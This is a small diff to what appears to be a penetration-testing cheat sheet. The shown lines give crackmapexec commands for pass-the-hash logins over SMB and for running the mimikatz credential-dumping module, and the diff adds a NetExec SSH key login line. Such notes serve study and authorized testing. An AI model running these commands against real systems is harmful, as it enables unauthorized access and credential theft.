@@ -2291,7 +2291,10 @@ crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
 crackmapexec smb -L #listing modules
 crackmapexec smb -M mimikatx --options #shows the required options for the module
 crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
-crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 
+crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M
+# Crackmapexec nxc ssh key brute forcing
+nxc ssh <IP> -u sarah -p '' --key-file idrsa_sarah
+
 ```
 
 - Crackmapexec database
